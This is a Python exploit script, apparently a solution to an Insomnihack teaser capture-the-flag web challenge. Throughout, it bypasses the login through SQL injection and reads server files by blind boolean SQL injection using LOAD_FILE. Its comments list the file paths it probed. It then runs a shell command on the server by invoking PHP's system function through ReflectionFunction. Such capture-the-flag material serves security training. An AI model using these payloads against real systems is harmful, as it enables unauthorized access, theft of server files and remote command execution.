#!/usr/bin/python3


import http.client
import re
import sys


def make_sqli(con, awselb, sql):
    con.request('POST', '/INSO.RPC',
                body=('{{"c":{{"name":"user"}},"a":{{"name":"login","params":'
                      '"\' OR {sql} -- |"}}}}').format(sql=sql),
                headers={'Connection': 'keep-alive',
                         'Cookie': 'AWSELB={}'.format(awselb)})
    resp_login = con.getresponse()
    if resp_login.status != 200:
        raise ValueError(resp_login.status)
    body = resp_login.read()
    if body == b'Login Success':
        return True
    if body == b'Login fail':
        return False
    raise ValueError('unknown login body {!r}'.format(body))


def eq_char(con, awselb, f, index, pivot):
    return make_sqli(con, awselb,
                     ('ASCII(SUBSTR(LOAD_FILE(\'{file}\'),'
                      '{index}, 1)) = {pivot}').format(file=f, index=index,
                                                       pivot=pivot))


def lt_char(con, awselb, f, index, pivot):
    return make_sqli(con, awselb,
                     ('ASCII(SUBSTR(LOAD_FILE(\'{file}\'),'
                      '{index}, 1)) < {pivot}').format(file=f, index=index,
                                                       pivot=pivot))


def brute_char(con, awselb, f, index):
    low = 0
    high = 256
    while True:
        mid = (low + high) // 2
        if eq_char(con, awselb, f, index, mid):
            return chr(mid)
        if lt_char(con, awselb, f, index, mid):
            if high == mid:
                raise ValueError(mid)
            high = mid
        else:
            if low == mid:
                raise ValueError(mid)
            low = mid


def brute(con, awselb, f, length):
    s = ''
    for i in range(1, length + 1):
        c = brute_char(con, awselb, f, i)
        s += c
        print(c, end='')
        sys.stdout.flush()
    print()
    return s


def main():
    con = http.client.HTTPConnection('ynos.teaser.insomnihack.ch')
    con.request('GET', '/', headers={'Connection': 'keep-alive'})
    resp_get = con.getresponse()
    if resp_get.status != 200:
        raise ValueError(resp_get.status)
    resp_get.read()

    cookies = dict(resp_get.getheaders())['Set-Cookie']
    m = re.search('AWSELB=(.*?);', cookies)
    awselb = m.group(1)

    # /etc/apache2/apache2.conf exists
    # /bin/sh and /bin/bash exist
    # /usr/sbin/apache2 exists
    # /usr/sbin/nginx does NOT exist
    # /public_html/index.php (index.phps, flag, flag.txt) does not exist
    # /var/www/html/index.php exists- YAYAYAYA
    # /var/www/html/INSO.RPC exists with length 426
#    brute(con, awselb, '/var/www/html/INSO.RPC', 426)
#    brute(con, awselb, '/var/www/html/functions.php', 596)
#    brute(con, awselb, '/var/www/html/classes.php', 1824)
#    brute(con, awselb, '/var/www/html/login.php', 1564)

    con.request('POST', '/INSO.RPC',
                body=('{"c":{"name":"user"},'
                      '"a":{"name":"login","params":"\' OR 1=1 -- |"}}'),
                      headers={'Connection': 'keep-alive',
                         'Cookie': 'AWSELB={}'.format(awselb)})
    resp_login = con.getresponse()
    if resp_login.status != 200:
        raise ValueError(resp_login.status)
    print(resp_login.read())

    cookies = dict(resp_login.getheaders())['Set-Cookie']
    m = re.search('session=(.*)', cookies)
    session = m.group(1)

    con.request('POST', '/INSO.RPC',
                body=('{"c":{"name":"ReflectionFunction", "params":"system"},'
                      '"a":{"name":"invoke","params":'
                      '"cat ___THE_FLAG_IS_IN_HERE___"}}'),
                headers={'Connection': 'keep-alive',
                         'Cookie': 'AWSELB={}; session={}'.format(awselb,
                                                                  session)})
    resp_view = con.getresponse()
    if resp_view.status != 200:
        raise ValueError(resp_view.status)
    print(resp_view.read().decode('utf-8'))

if __name__ == '__main__':
    main()
